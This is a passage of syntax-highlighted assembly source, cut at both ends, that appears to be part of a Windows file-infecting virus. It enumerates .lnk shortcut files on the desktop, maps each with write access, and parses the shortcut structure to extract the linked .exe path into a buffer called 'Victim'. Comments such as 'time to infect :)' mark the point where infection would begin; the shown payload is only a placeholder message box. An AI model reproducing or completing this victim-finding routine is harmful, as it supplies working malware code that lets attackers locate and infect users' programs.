<span style="color: black; font-style: italic;">;-----change directory to desktop path---end------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----find first file in current directory--------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke FindFirstFile<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;the well known api</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;LnkFiles<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;search for *.lnk</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Win32FindData &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;structure</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>FindHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save find handle</span><br/>
<br/>
FindMoreFiles<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;error? no more files?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> Exit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;exit the application</span><br/>
<span style="color: black; font-style: italic;">;-----find first file in current directory---end--------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----map lnk file to handle with it--------------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateFile<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;open the file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Win32FindData<span style="color: #339933;">.</span>cFileName<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;the lnk file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;GENERIC_READ <span style="color: #339933;">+</span> GENERIC_WRITE<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;read and write access</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;FILE_SHARE_READ<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;open it when we can read</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;no security attributes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;OPEN_EXISTING<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;open only the file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;FILE_ATTRIBUTE_NORMAL<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;all attributes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;no flag</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> INVALID_HANDLE_VALUE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;error?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> FindNextLNK &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;find next lnk file</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>FileHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save file handle</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateFileMapping<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;create the map</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>FileHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;handle of file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;no security attributes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PAGE_READWRITE<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;read and write mapping</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;size high -&gt; null</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;size low &nbsp;-&gt; null = size of whole file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;no mapping name</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;error?!</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> CloseFile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;close the file and search next</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>MapHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;save mapping handle</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke MapViewOfFile<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;write map to address</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>MapHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;handle of created map</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;FILE_MAP_WRITE<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;read and write</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;high offset</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;low offset -&gt; null, address is after call in eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;how much bytes should be mappep? 0-&gt; all</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;error?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> CloseMap &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;if so close the map, search next file</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>MapAddress<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save address in memory where file begins</span><br/>
<span style="color: black; font-style: italic;">;-----map lnk file to handle with it---end--------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----check if .lnk file is valid-----------------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>MapAddress<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;filebegin now in esi</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;L&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;first dword is a 4C000000h ?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> CloseMap &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;close map, search more files</span><br/>
<span style="color: black; font-style: italic;">;-----check if .lnk file is valid---end-----------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----get linked application----------------------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4Ch</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;jump over header</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> ItemSize &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;to copy size of Shell Item List</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;copy one byte, the size (esi-&gt;edi)</span><br/>
<br/>
JumpOverItem<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span>ItemSize<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> 0d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;counter on zero?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> JumpedOver &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;then we jumped over the Shell Item List strcture</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;address + 1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span>ItemSize<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;counter - 1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> JumpOverItem &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;next byte</span><br/>
<br/>
JumpedOver<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">22h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;jump over FileLoationInfo</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0Ch</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;jump over Location Volume Table to the volume label (ASCIZ)</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> Victim &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;destination is Victim (esi-&gt;edi)</span><br/>
<br/>
CopyVictimString<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;0 -&gt; end of the string (ASCIZ[ero])</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> HaveVictim &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;time to infect :)</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;move one byte from esi to edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> CopyVictimString &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;check again for end of string</span><br/>
<br/>
HaveVictim<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;clear all after string</span><br/>
<span style="color: black; font-style: italic;">;-----get linked application---end----------------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----check if victim path is valid---------------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> Victim &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get address</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span> <span style="color: #339933;">+</span> 1d<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;:&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;check for the : (eg C:)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> CloseMap &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;if not then close map, search next file</span><br/>
<br/>
GetVictimZero<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;check for end of string</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> HaveVictimZero &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;we have it</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;next byte</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> GetVictimZero &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;search for zero</span><br/>
<br/>
HaveVictimZero<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span> <span style="color: #339933;">-</span> 4d<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;.&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;check for dot (eg .exe)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> CloseMap &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;search next</span><br/>
<span style="color: black; font-style: italic;">;-----check if victim path is valid---end---------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;*******************************************************</span><br/>
<span style="color: black; font-style: italic;">;*****HERE GO THE INFECTION*****************************</span><br/>
<span style="color: black; font-style: italic;">;*******************************************************</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke MessageBox<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;only show a messagebox that it works</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;now owner window</span><br/>
